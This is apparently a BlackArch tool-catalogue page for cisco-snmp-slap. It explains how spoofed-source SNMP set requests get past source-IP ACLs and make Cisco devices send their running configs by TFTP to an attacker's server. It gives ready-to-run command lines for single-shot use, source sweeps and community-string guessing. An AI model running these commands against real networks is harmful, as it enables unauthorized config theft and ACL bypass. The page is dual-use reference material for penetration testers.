---
name: "cisco-snmp-slap"
categories:
  - blackarch-spoof
version: "5.daf0589"
homepage: "https://github.com/nccgroup/cisco-snmp-slap"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "nccgroup/cisco-snmp-slap"
github-stars: 59
github-pushed: "2014-11-27"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# cisco-snmp-slap

> NCC Group's Python 2 script that exfiltrates a Cisco IOS running config by sending spoofed-source SNMP set requests, making the device TFTP-upload its configuration to the attacker's server.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Defeating an ACL that only trusts certain source IPs in front of an SNMP service. You cannot complete a TCP handshake from a spoofed address, but SNMP over UDP needs no handshake — so this tool forges the packet source, guesses a read-write community string, and sets the MIB that tells IOS to copy its running config to a TFTP server of your choice. It walks candidate source addresses (sequentially or randomly, across an arbitrary bitmask, not just subnets) and candidate community strings (from a file), detecting success simply by watching for the config file landing in your TFTP root. Written for layer-3 switches, which in the author's experience rarely have reverse-path verification enabled. You supply the TFTP server yourself, and the tool is Python 2 with scapy — run it from an era-appropriate environment. The catching limit is inherent: UDP spoofing means the reply goes to the spoofed address, which is exactly why the config is pushed to you over a separate TFTP connection instead.

## Typical use cases

### Grab a config with a known community string and trusted IP

One sentence of intent: one shot when reconnaissance already gave you both secrets.

```
sudo cisco-snmp-slap single private 198.51.100.5 198.51.100.100 198.51.100.10
```

Outcome: sends a single spoofed SNMP set (source `198.51.100.100`, community `private`) telling device `198.51.100.10` to TFTP its running config to `198.51.100.5`; the config file appears in the TFTP server's root directory within seconds. Modes: `single`, then the community string, TFTP server IP, spoofed source IP, destination IP.

### Sweep a source-address range for ACL holes

One sentence of intent: find any trusted source when you do not know which the ACL permits.

```
sudo cisco-snmp-slap seqmask private 198.51.100.5 198.51.100.0 0.0.0.255 198.51.100.10 /tftproot/
```

Outcome: walks source addresses `198.51.100.0`–`198.51.100.255` in order (any bitmask works — set bits vary), printing each address tried; the run ends with `Success!` once the config turns up in `/tftproot/`. The exact winning source cannot be identified, only that one request in the recent window succeeded — open the config to read the ACL yourself. `randmask` tries the same space in random order.

### Try a list of community strings at once

One sentence of intent: combine address sweeping with password guessing.

```
sudo cisco-snmp-slap seqmask_l /usr/share/cisco-snmp-slap/list.txt 198.51.100.5 198.51.100.0 0.0.0.255 198.51.100.10 /tftproot/
```

Outcome: every candidate source address is paired with every community string in the file (one per line), the output showing each `address / community` combination attempted; success is again the config file appearing in the TFTP root. Every mode has an `_l` variant that takes a community-file argument instead of a single string.
